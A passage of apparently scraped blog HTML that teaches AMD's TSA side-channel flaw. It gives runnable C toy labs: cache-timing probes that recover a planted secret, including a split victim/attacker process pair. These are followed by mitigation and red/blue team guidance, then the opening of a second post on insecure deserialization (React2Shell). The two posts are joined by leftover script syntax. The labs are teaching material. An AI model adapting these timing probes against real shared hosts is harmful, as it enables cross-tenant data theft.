    <span class="pl-en">printf</span>(<span class="pl-s">"Best index = %d (time = %u cycles)\\n"</span>, <span class="pl-s1">best_idx</span>, <span class="pl-s1">best_time</span>);

    <span class="pl-c">// Recover an approximation of the secret</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">recovered</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ (<span class="pl-smi">uint8_t</span>)<span class="pl-s1">best_idx</span>;
    <span class="pl-en">printf</span>(<span class="pl-s">"Actual secret    = 0x%02x\\n"</span>, <span class="pl-s1">secret</span>);
    <span class="pl-en">printf</span>(<span class="pl-s">"Recovered secret = 0x%02x\\n"</span>, <span class="pl-s1">recovered</span>);

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>What’s happening here:</p>
<ul>
<li>The victim repeatedly touches <code>probe_array[(attacker_hint ^ secret) * STRIDE]</code>,</li>
<li>That specific cache line becomes hot,</li>
<li>The attacker times every index and infers which is fastest,</li>
<li>From that <code>best_idx</code>, it guesses <code>secret ≈ attacker_hint ^ best_idx</code>.</li>
</ul>
<p>This is the <strong>same mental structure</strong> as real microarchitectural leaks: you never read the secret directly; you watch how <strong>transient microarchitectural state changes timing</strong>.</p>
<p>On a modern CPU, you may need to run it multiple times, average results, or tweak <code>PROBE_SIZE</code> / <code>STRIDE</code> to get a clear signal.</p>
<div class="markdown-heading"><h3 class="heading-element">4.2 Variant without <code>rdtsc</code>: using <code>clock_gettime</code>
</h3><a id="user-content-42-variant-without-rdtsc-using-clock_gettime" class="anchor" aria-label="Permalink: 4.2 Variant without rdtsc: using clock_gettime" href="#42-variant-without-rdtsc-using-clock_gettime"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>If you want a version that doesn’t rely on <code>rdtsc</code> (e.g., on some systems it may be restricted or noisy), here’s a variant using <code>clock_gettime</code> with <code>CLOCK_MONOTONIC_RAW</code>. It’s less precise but more portable.</p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// gcc -O2 -march=native -o tsa_toy_posix tsa_toy_posix.c</span>

<span class="pl-k">#define</span> <span class="pl-s1">_GNU_SOURCE</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;time.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>   <span class="pl-c">// for _mm_clflush</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-smi">uint8_t</span> <span class="pl-s1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x2A</span>;  <span class="pl-c">// 42 decimal</span>

<span class="pl-k">static</span> <span class="pl-k">inline</span> <span class="pl-smi">uint64_t</span> <span class="pl-en">nsec_now</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">struct</span> <span class="pl-smi">timespec</span> <span class="pl-s1">ts</span>;
    <span class="pl-en">clock_gettime</span>(<span class="pl-c1">CLOCK_MONOTONIC_RAW</span>, <span class="pl-c1">&amp;</span><span class="pl-s1">ts</span>);
    <span class="pl-k">return</span> (<span class="pl-smi">uint64_t</span>)<span class="pl-s1">ts</span>.<span class="pl-c1">tv_sec</span> <span class="pl-c1">*</span> <span class="pl-c1">1000000000ull</span> <span class="pl-c1">+</span> <span class="pl-s1">ts</span>.<span class="pl-c1">tv_nsec</span>;
}

<span class="pl-smi">void</span> <span class="pl-en">victim_operation</span>(<span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span>) {
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
}

<span class="pl-smi">void</span> <span class="pl-en">flush_probe_array</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }
}

<span class="pl-smi">uint64_t</span> <span class="pl-en">time_access_ns</span>(<span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">nsec_now</span>();
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">nsec_now</span>();

    <span class="pl-k">return</span> <span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>;
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x05</span>;

    <span class="pl-c">// Simple multiple trials to average timing</span>
    <span class="pl-k">const</span> <span class="pl-smi">int</span> <span class="pl-s1">trials</span> <span class="pl-c1">=</span> <span class="pl-c1">50</span>;

    <span class="pl-c">// prime+victim</span>
    <span class="pl-en">flush_probe_array</span>();
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">1000</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">victim_operation</span>(<span class="pl-s1">attacker_hint</span>);
    }

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT64_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint64_t</span> <span class="pl-s1">total</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>;
        <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">trials</span>; <span class="pl-s1">t</span><span class="pl-c1">++</span>) {
            <span class="pl-s1">total</span> <span class="pl-c1">+=</span> <span class="pl-en">time_access_ns</span>(<span class="pl-s1">idx</span>);
        }
        <span class="pl-smi">uint64_t</span> <span class="pl-s1">avg</span> <span class="pl-c1">=</span> <span class="pl-s1">total</span> / <span class="pl-s1">trials</span>;

        <span class="pl-k">if</span> (<span class="pl-s1">avg</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">avg</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index = %d (avg time = %llu ns)\\n"</span>,
           <span class="pl-s1">best_idx</span>, (<span class="pl-smi">unsigned long long</span>)<span class="pl-s1">best_time</span>);

    <span class="pl-smi">uint8_t</span> <span class="pl-s1">recovered</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ (<span class="pl-smi">uint8_t</span>)<span class="pl-s1">best_idx</span>;
    <span class="pl-en">printf</span>(<span class="pl-s">"Actual secret    = 0x%02x\\n"</span>, <span class="pl-s1">secret</span>);
    <span class="pl-en">printf</span>(<span class="pl-s">"Recovered secret = 0x%02x\\n"</span>, <span class="pl-s1">recovered</span>);

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>This looks similar to the timing setups in CPU side-channel courses and Spectre labs, where you average many samples to separate cache hits from misses.</p>
<div class="markdown-heading"><h3 class="heading-element">4.3 Splitting victim and attacker (two processes, shared memory)</h3><a id="user-content-43-splitting-victim-and-attacker-two-processes-shared-memory" class="anchor" aria-label="Permalink: 4.3 Splitting victim and attacker (two processes, shared memory)" href="#43-splitting-victim-and-attacker-two-processes-shared-memory"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>To make the lab feel more like a <strong>cross-process leak</strong> (closer to TSA’s “other context” threat model), you can separate victim and attacker into <strong>two processes</strong> that share memory via <code>shm_open</code> / <code>mmap</code>.</p>
<p><strong>Shared header:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// common.h</span>
<span class="pl-k">#pragma</span> once
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> {
    <span class="pl-smi">uint8_t</span> <span class="pl-c1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">stop</span>;      <span class="pl-c">// flag to tell victim to stop</span>
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">ready</span>;     <span class="pl-c">// flag for simple sync</span>
};</pre></div>
<p><strong>Victim process:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// victim.c</span>
<span class="pl-c">// gcc -O2 -march=native -o victim victim.c -lrt</span>

<span class="pl-k">#include</span> <span class="pl-s">"common.h"</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;sys/mman.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;fcntl.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>

<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x7F</span>;

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-smi">int</span> <span class="pl-s1">fd</span> <span class="pl-c1">=</span> <span class="pl-en">shm_open</span>(<span class="pl-s">"/tsa_demo"</span>, <span class="pl-c1">O_RDWR</span> | <span class="pl-c1">O_CREAT</span>, <span class="pl-c1">0600</span>);
    <span class="pl-en">ftruncate</span>(<span class="pl-s1">fd</span>, <span class="pl-k">sizeof</span>(<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span>));
    <span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span> <span class="pl-c1">=</span> <span class="pl-en">mmap</span>(<span class="pl-c1">NULL</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">*</span><span class="pl-s1">sh</span>),
                                    <span class="pl-c1">PROT_READ</span> | <span class="pl-c1">PROT_WRITE</span>,
                                    <span class="pl-c1">MAP_SHARED</span>, <span class="pl-s1">fd</span>, <span class="pl-c1">0</span>);

    <span class="pl-c">// Initialize</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">ready</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span>;

    <span class="pl-k">while</span> (!<span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">stop</span>) {
        <span class="pl-c">// attacker_hint could be communicated via shared memory too;</span>
        <span class="pl-c">// here we just fix it for simplicity</span>
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x11</span>;
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;
        <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;
        __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
    }

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p><strong>Attacker process:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// attacker.c</span>
<span class="pl-c">// gcc -O2 -march=native -o attacker attacker.c -lrt</span>

<span class="pl-k">#include</span> <span class="pl-s">"common.h"</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;sys/mman.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;fcntl.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-smi">uint32_t</span> <span class="pl-en">time_access</span>(<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span>, <span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-smi">unsigned</span> <span class="pl-s1">aux</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    <span class="pl-k">return</span> (<span class="pl-smi">uint32_t</span>)(<span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>);
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-smi">int</span> <span class="pl-s1">fd</span> <span class="pl-c1">=</span> <span class="pl-en">shm_open</span>(<span class="pl-s">"/tsa_demo"</span>, <span class="pl-c1">O_RDWR</span>, <span class="pl-c1">0600</span>);
    <span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span> <span class="pl-c1">=</span> <span class="pl-en">mmap</span>(<span class="pl-c1">NULL</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">*</span><span class="pl-s1">sh</span>),
                                    <span class="pl-c1">PROT_READ</span> | <span class="pl-c1">PROT_WRITE</span>,
                                    <span class="pl-c1">MAP_SHARED</span>, <span class="pl-s1">fd</span>, <span class="pl-c1">0</span>);

    <span class="pl-c">// Wait for victim to init</span>
    <span class="pl-k">while</span> (!<span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">ready</span>) { }

    <span class="pl-c">// Flush cache lines first</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }

    <span class="pl-c">// Give victim some time to run and "prime" one line</span>
    <span class="pl-en">usleep</span>(<span class="pl-c1">10000</span>);

    <span class="pl-smi">uint32_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint32_t</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-en">time_access</span>(<span class="pl-s1">sh</span>, <span class="pl-s1">idx</span>);
        <span class="pl-k">if</span> (<span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">t</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index (cross-proc) = %d, time = %u cycles\\n"</span>,
           <span class="pl-s1">best_idx</span>, <span class="pl-s1">best_time</span>);

    <span class="pl-c">// Tell victim to stop</span>
    <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">stop</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span>;

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>This is closer in spirit to <strong>“victim in one context, attacker in another”</strong>, even though they’re still on the same OS and sharing memory explicitly. Real TSA removes that explicit sharing: instead of a shared array, the “shared state” is the CPU’s internal scheduler, store queue, and L1 cache.</p>
<div class="markdown-heading"><h3 class="heading-element">4.4 Connecting the lab back to TSA</h3><a id="user-content-44-connecting-the-lab-back-to-tsa" class="anchor" aria-label="Permalink: 4.4 Connecting the lab back to TSA" href="#44-connecting-the-lab-back-to-tsa"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Right after these code sections, the key takeaway is:</p>
<ul>
<li>
<p>Our toy lab uses <strong>cache presence</strong> as the side-channel signal (classic Flush+Reload / Prime+Probe).</p>
</li>
<li>
<p>TSA uses <strong>scheduler timing</strong> as the side-channel signal:</p>
<ul>
<li>False completions → invalid data forwarded → different dependency chains → different timing.</li>
</ul>
</li>
<li>
<p>In both cases, the attacker:</p>
<ol>
<li>
<strong>Influences</strong> microarchitectural state (priming),</li>
<li>Lets a victim touch secret-dependent data (access pattern),</li>
<li>Measures a <strong>timing difference</strong> in its own code,</li>
<li>Reconstructs bits of the secret over many trials.</li>
</ol>
</li>
</ul>
<p>That’s the mental bridge you want readers to cross.</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">5. Mitigations: what AMD, OSs, and clouds are doing</h2><a id="user-content-5-mitigations-what-amd-oss-and-clouds-are-doing" class="anchor" aria-label="Permalink: 5. Mitigations: what AMD, OSs, and clouds are doing" href="#5-mitigations-what-amd-oss-and-clouds-are-doing"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>TSA mitigations span firmware, OS, and virtualization layers.</p>
<div class="markdown-heading"><h3 class="heading-element">5.1 Microcode + VERW</h3><a id="user-content-51-microcode--verw" class="anchor" aria-label="Permalink: 5.1 Microcode + VERW" href="#51-microcode--verw"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD ships updated <strong>microcode</strong> for vulnerable Family 19h CPUs. On top of that, they recommend using the memory form of the <code>VERW</code> instruction as a “microarchitectural scrub”:</p>
<ul>
<li>New CPUID bits tell software:
<ul>
<li>Whether TSA-L1 / TSA-SQ are not present,</li>
<li>Whether the CPU supports TSA mitigation via <code>VERW_CLEAR</code>.</li>
</ul>
</li>
<li>With appropriate microcode loaded, <strong>CPL0 (kernel / hypervisor)</strong> can execute <code>VERW</code> to clear TSA-relevant structures when crossing trust boundaries, e.g.:
<ul>
<li>Kernel → user transitions,</li>
<li>Hypervisor → guest VM transitions,</li>
<li>Before entering low-power states.</li>
</ul>
</li>
</ul>
<p>This is similar in spirit to existing post-Spectre mitigations (IBPB, STIBP, etc.) but targeted at scheduler structures.</p>
<div class="markdown-heading"><h3 class="heading-element">5.2 Linux <code>MITIGATION_TSA</code> and <code>tsa=</code> knob</h3><a id="user-content-52-linux-mitigation_tsa-and-tsa-knob" class="anchor" aria-label="Permalink: 5.2 Linux MITIGATION_TSA and tsa= knob" href="#52-linux-mitigation_tsa-and-tsa-knob"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Linux added explicit support for TSA mitigations:</p>
<ul>
<li>A new Kconfig option <code>MITIGATION_TSA</code> gates TSA-related logic.</li>
<li>A boot parameter <code>tsa=</code> controls behavior (e.g., always on, only for user/kernel transitions, only guest/host transitions, or disabled).</li>
<li>Combined with updated microcode from <code>linux-firmware</code>, this lets distros tune performance vs security trade-offs depending on threat model.</li>
</ul>
<div class="markdown-heading"><h3 class="heading-element">5.3 SEV-SNP and attestation</h3><a id="user-content-53-sev-snp-and-attestation" class="anchor" aria-label="Permalink: 5.3 SEV-SNP and attestation" href="#53-sev-snp-and-attestation"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>For AMD’s <strong>SEV-SNP</strong> (encrypted VM) environments:</p>
<ul>
<li>TSA could, in principle, allow a malicious hypervisor to infer SEV-SNP guest data.</li>
<li>Microcode and firmware updates aim to automatically mitigate TSA for SEV-SNP guests.</li>
<li>Guest owners are expected to:
<ul>
<li>Verify via <strong>attestation</strong> that the host is running the right microcode,</li>
<li>Confirm that TSA mitigations are active before trusting the platform.</li>
</ul>
</li>
</ul>
<hr>
<div class="markdown-heading"><h2 class="heading-element">6. What red teams and blue teams should actually do</h2><a id="user-content-6-what-red-teams-and-blue-teams-should-actually-do" class="anchor" aria-label="Permalink: 6. What red teams and blue teams should actually do" href="#6-what-red-teams-and-blue-teams-should-actually-do"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<div class="markdown-heading"><h3 class="heading-element">6.1 For red teams</h3><a id="user-content-61-for-red-teams" class="anchor" aria-label="Permalink: 6.1 For red teams" href="#61-for-red-teams"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>TSA probably won’t be your <strong>first</strong> move in a real engagement, but it’s worth understanding as part of a modern attack surface:</p>
<ul>
<li>
<strong>Model it as a capability</strong>:
<ul>
<li>“Given local code execution on a shared AMD Zen 3/4 host, I may be able to leak bits of privileged data over time.”</li>
</ul>
</li>
<li>
<strong>Think in campaigns, not single shots</strong>:
<ul>
<li>Meeting the timing conditions and noise requirements means you want long-lived footholds and repeated victim activity.</li>
</ul>
</li>
<li>
<strong>Use it to stress test cloud models</strong>:
<ul>
<li>Ask: “If I’m a rogue tenant on this EPYC host, what’s the maximum <em>theoretical</em> data I can extract from neighbors?”</li>
</ul>
</li>
</ul>
<p>TSA is a great hook for talks and blogs because it forces teams to think beyond “network perimeter” and even beyond “syscall boundary.” The CPU itself is part of the threat surface.</p>
<div class="markdown-heading"><h3 class="heading-element">6.2 For blue teams</h3><a id="user-content-62-for-blue-teams" class="anchor" aria-label="Permalink: 6.2 For blue teams" href="#62-for-blue-teams"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Concrete actions:</p>
<ol>
<li>
<p><strong>Patch like this is Meltdown-class, not just ‘medium CVSS’</strong></p>
<ul>
<li>Make sure:
<ul>
<li>Firmware/microcode is up to date for all Family 19h platforms,</li>
<li>OS / hypervisor builds include TSA mitigations and have <code>tsa=</code> configured appropriately.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Re-evaluate your multi-tenant risk</strong></p>
<ul>
<li>In clouds and shared hosting:
<ul>
<li>Understand which SKUs are affected,</li>
<li>Decide whether you treat TSA as an academic curiosity or something you must mitigate for specific tenants (e.g., high-sensitivity workloads).</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Include TSA in your threat modeling</strong></p>
<ul>
<li>It’s an <strong>info-leak primitive</strong>, not an RCE.</li>
<li>Combine it mentally with other bugs:
<ul>
<li>RCE → TSA → secret exfiltration → crypto break → lateral movement.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Watch for performance regressions</strong></p>
<ul>
<li>VERW-based mitigations may hurt performance; you’ll need to benchmark and possibly make different choices per environment (internal dev vs multi-tenant cloud vs regulated workloads).</li>
</ul>
</li>
</ol>
<hr>
`,fv=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server</h1>
    <blockquote>
      <p>"Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation." — OWASP</p>
    </blockquote>
    <p>CVE-2025-55182 ("React2Shell") pushed insecure deserialization back into the spotlight:</p>
    <ul>
      <li>It’s a CVSS 10.0 RCE in <strong>React Server Components</strong> (RSC).</li>
      <li>The bug lives in the <strong>Flight protocol</strong> used by RSC: attacker-controlled data is <strong>deserialized unsafely</strong>, letting crafted objects influence server-side execution and achieve code execution on the Node.js server.</li>
    </ul>
    <p>You absolutely shouldn’t be testing real React2Shell payloads against anything but an isolated lab. But you <em>can</em> understand the core pattern with a <strong>tiny, self-contained Node.js example</strong> that mimics the same <em>class</em> of bug: deserialization of untrusted data → treating it as special internal objects → executing attacker-controlled behavior.</p>
    <p>This post walks through:</p>
    <ul>
      <li>A quick refresher on insecure deserialization.</li>
      <li>A <strong>toy "fake Flight" server</strong> in Node/Express that’s intentionally vulnerable.</li>
      <li>A harmless "payload" that only evaluates math.</li>
      <li>A safer version of the same endpoint.</li>
      <li>How this maps conceptually to real-world bugs like React2Shell.</li>
    </ul>
    <hr />
    <h2>1. Insecure deserialization in one paragraph</h2>
    <p>Insecure deserialization is when an application takes <strong>untrusted data</strong>, deserializes it into objects, and then uses those objects in ways that let an attacker:</p>
    <ul>
      <li>Manipulate logic,</li>
      <li>Abuse "magic" methods or callbacks,</li>
      <li>Or even <strong>execute arbitrary code</strong>.</li>
    </ul>
